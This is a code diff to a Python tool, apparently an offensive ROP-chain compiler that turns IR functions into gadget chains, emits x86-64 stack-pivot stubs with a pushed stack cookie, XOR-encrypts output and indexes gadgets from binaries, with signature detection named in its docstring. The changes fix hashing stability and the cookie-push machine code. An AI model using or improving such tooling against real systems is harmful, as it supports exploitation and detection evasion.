@@ -27,6 +27,7 @@ engineering, signature detection.
 Dependencies: None (standard library only: json, os, subprocess, struct, sys).
 """
 
+import hashlib
 import json
 import os
 import subprocess
@@ -176,11 +177,11 @@ class RopFunctionCompiler:
             if op.startswith("%") or op.startswith("@"):
                 return self.var_map.get(op, 0)
             if op.startswith('"') and op.endswith('"'):
-                return hash(op) & 0xFFFFFFFF
+                return _stable_id(op)
             try:
                 return int(op, 0)
             except ValueError:
-                return hash(op) & 0xFFFFFFFF
+                return _stable_id(op)
         if hasattr(operand, 'name'):
             opname = operand.name
             if opname in self.var_map:
@@ -188,7 +189,7 @@ class RopFunctionCompiler:
             try:
                 return int(opname, 0)
             except (ValueError, TypeError):
-                return hash(opname) & 0xFFFFFFFF
+                return _stable_id(opname)
         return 0
 
     def compile_ir_function(self, ir_function: dict) -> list[int]:
@@ -553,9 +554,12 @@ class RopFunctionCompiler:
         stub.extend([0x48, 0xBC])
         stub.extend(pivot_address.to_bytes(8, 'little'))
 
-        stack_cookie = 0xDEADBEEFCAFEBABE ^ hash(tuple(chain)) & 0xFFFFFFFFFFFFFFFF
-        stub.extend([0x48, 0xBE])
+        stack_cookie = 0xDEADBEEFCAFEBABE ^ _stable_id(repr(tuple(chain)))
+        # mov rax, imm64; push rax -- the cookie has to land on the stack.
+        # `mov rsi, imm64` (48 BE) only parked it in a register.
+        stub.extend([0x48, 0xB8])
         stub.extend(stack_cookie.to_bytes(8, 'little'))
+        stub.append(0x50)
 
         stub.extend([0x49, 0x89, 0xE7])
 
@@ -578,6 +582,11 @@ class RopFunctionCompiler:
             encrypted.append(b ^ key[i % len(key)])
         return bytes(encrypted)
 
+
+
+def _stable_id(value) -> int:
+    """32-bit id that is stable across processes (``hash()`` is salted)."""
+    return int.from_bytes(hashlib.blake2b(str(value).encode(), digest_size=4).digest(), "little")
 
 def generate_gadget_database(binary_path: str) -> dict:
     """
